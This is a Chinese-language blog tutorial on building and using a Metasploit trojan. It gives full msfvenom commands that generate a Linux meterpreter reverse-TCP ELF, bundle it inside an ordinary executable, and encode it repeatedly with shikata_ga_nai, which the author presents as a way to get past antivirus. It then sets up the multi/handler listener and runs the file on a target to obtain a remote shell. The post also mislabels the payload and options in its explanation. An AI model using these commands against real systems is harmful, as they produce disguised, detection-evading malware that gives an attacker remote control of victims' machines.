---
title: Metasploit 木马编译利用
date: 2022-4-2 23:29:09
tags: [Trojan horse,Linux,Kali,Metasploit]
categories: 
 - [CyberSecurity,木马]
cover: https://res.cloudinary.com/sycamore/image/upload/v1682442126/Typera/2023/04/87d91c5d20cc130aa72fe99c74a9e8c2.png
---

:::default
**Metasploit**是一个开源的，可用来**发现**、**验证**并**利用**漏洞的渗透测试平台。

Kali 中默认安装了 **Metasploit** 框架。
:::

## msfvenom 命令实现木马生成、捆绑以及免杀处理

**简介：**

**msfvenom** 是 **Metasploit** 中的一个命令。

**msfvenom** 命令结合了 msfpayload 和 msfencoder 的功能，能够**生成木马**，并实现木马编码**免杀**和避免坏字符、捆绑木马等。

### msfvenom 命令用法
涉及到的**选项**有：

**-l**：列出指定**模块**（包括payloads, encoders, nops, platforms, archs, encrypt, formats, all）的所有可用**资源**。其中 **payloads** 对应的就是**木马**。

**-p**：指定需要使用的 **payload** ，可以指定 ‘-’ 或者 stdin 来**自定义** payload。
如果不知道 payload 包括哪些选项，可以使用 `--list-options` 列出 payload 的标准选项。

**-f**：指定payload的**输出格式**，可以使用 `--list formats` 来列出可选的格式。

**-o**：指定输出的payload的**保存路径**，也可以采用**重定向**的方式来替代-o选项。

**-x**： 指定一个**自定义**的**可执行文件**作为模板。即，把木马**捆绑**到指定的可执行文件上。

**-e**：指定使用的**编码器**（）。

**-i**： 指定对 payload 编码的**次数**
### 木马生成
1. 先使用 `msfvenom -l payloads` 命令，查看**可用的木马**。
因为可用的木马有**很多**，所以可以根据所需木马的特性、结合 **grep** 限定木马的种类 ![image-20230426010221520](https://res.cloudinary.com/sycamore/image/upload/v1682442146/Typera/2023/04/ebeb726eacc7fad3302b80554fb13af1.png)
以木马 `linux/x86/meterpreter/reverse_tcp`（反向连接)作为样例，
<br>
2. 查看该木马**需要设置的选项**：
`msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options`![image-20230426010409894](https://res.cloudinary.com/sycamore/image/upload/v1682442254/Typera/2023/04/874f3751e4961c5140e9e30ca40f22e7.png)


<br>

3. 查看可指定的**输出格式**：
`msfvenom --list formats`![image-20230426010426398](https://res.cloudinary.com/sycamore/image/upload/v1682442270/Typera/2023/04/38ea1bb4d485262080541e030e6fc0a3.png)
<br>

4. 参考上面得到的信息，构造**生成木马**的命令：
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -o /root/payload.elf`![image-20230426010433724](https://res.cloudinary.com/sycamore/image/upload/v1682442278/Typera/2023/04/09553b61c2c9d88fe78ede3ea742468a.png)


其中，**-p** 选择生成的木马为：**linux/x64/shell_bind_tcp**；
**RHOST** 指定将要攻击的**目标主机**的**IP**；
**LPORT** 指定对应端口号（默认为4444，故可以不写）；
**-f** 指定生成木马文件的文件**类型**为 **elf**
**-o** 指定保存生成的木马文件的**地址**为：**/root/payload.elf**

### 木马捆绑
通常情况下，木马会和正常的文件**捆绑**在一起，方便木马进行**感染**和**传播**。

所以，我们要事先准备好一个用于**绑定**的文件，这里选用的是 `/root/hello_world`（ **gcc** 编译的一个简单的C程）。

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -x /root/hello_world -o /root/payload_bundle.elf`
![image-20230426010440843](https://res.cloudinary.com/sycamore/image/upload/v1682442285/Typera/2023/04/c7bc72a382ae694be589d6a5cb25a3de.png)


其中，**-x** 指定**绑定**的可执行文件为 `/root/hello_world`，其余项与生成木马的指令一致。


### 木马免杀
在杀毒软件泛滥的今天，不对木马文件进行免杀处理很难通过**杀软的检查**，所以需要对木马进行**免杀**处理。

查看可用的编码器：`msfvenom -l encoders`
![image-20230426010444808](https://res.cloudinary.com/sycamore/image/upload/v1682442290/Typera/2023/04/d9aa39a90db02fe251a93aff3dd31cb7.png)

选用**免杀**效果较好的 **x86/shikata_ga_nai** 编译器进行编码。
命令：`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf -x /root/hello_world -o /root/payload_Anti_Virus.elf`
![image-20230426010449517](https://res.cloudinary.com/sycamore/image/upload/v1682442294/Typera/2023/04/9f32f881202e4a535bac4f5ce0f8c517.png)


其中，**-e** 指定编译器为 **x86/shikata_ga_nai**，
**-i** 指定编码的次数为 5 次。
编码 **5** 次的木马，基本可以**躲避部分**杀软的查杀，

当然可以对木马进行**更多次**的编码，这样可以**提高**木马的**免杀机率**，但是需要注意：这也可能会导致木马**不可使用**。

## msfconsole 木马利用
使用之前生成的木马文件： **payload.elf**。

### 攻击端：

输入命令 `msfconsole` 打开 **MSF 控制台**
![image-20230426010454524](https://res.cloudinary.com/sycamore/image/upload/v1682442298/Typera/2023/04/2c2e815f13d049741cd9371ace771daa.png)



输入命令：`use exploit/multi/handler`，选择exploit模块

然后，可以输入命令 `show options` 查看**设置的参数**（查看还要设置哪些）
![trojan-horse10](https://res.cloudinary.com/sycamore/image/upload/v1704010005/Typera/2023/12/4a6d04ee3788a771e9fe642e64fa8104.png)




命令 `set PAYLOAD linux/x86/meterpreter/reverse_tcp` ，设置 **PAYLOAD** 
命令 `set LHOST 192.168.158.132`，设置local host 的**IP**

命令 `run` 开始**监听**对应的端口，等待**目标服务器**执行**木马**后，就能获得 **shell**。
如下图所示：
![image-20230426010500036](https://res.cloudinary.com/sycamore/image/upload/v1682442304/Typera/2023/04/8b2780434593170f1b8173cf9fa13836.png)



### 目标服务器：

用各种方式将**木马文件**传到**目标服务器**上，

命令 `chmod +x payload.elf` 更改文件执行权限

执行 **payload.elf** 文件（**顺序**：要在攻击端开始监听之后执行）：
![image-20230426010506608](https://res.cloudinary.com/sycamore/image/upload/v1682442311/Typera/2023/04/80d816c18312f780f743c4b82696c43f.png)


整理一下：
- 攻击端：
1. `msfconsole`
2. `use exploit/multi/handler`
3. `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
4.` set LHOST 192.168.158.132`
5. `run`，开始监听
- 目标服务器：
1. 下载木马文件
2. `chmod +x payload.elf`
3. `./ payload.elf`
